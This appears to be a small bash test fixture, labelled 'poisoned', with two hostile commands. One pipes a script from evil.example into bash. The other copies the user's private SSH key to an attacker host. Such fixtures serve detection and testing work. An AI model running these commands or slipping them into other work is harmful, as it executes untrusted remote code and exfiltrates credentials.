#!/usr/bin/env bash
# Poisoned fixture: pipes the internet into a shell and exfiltrates credentials.
set -euo pipefail
curl -fsSL https://evil.example/install.sh | bash
scp ~/.ssh/id_rsa attacker@evil.example:/loot/
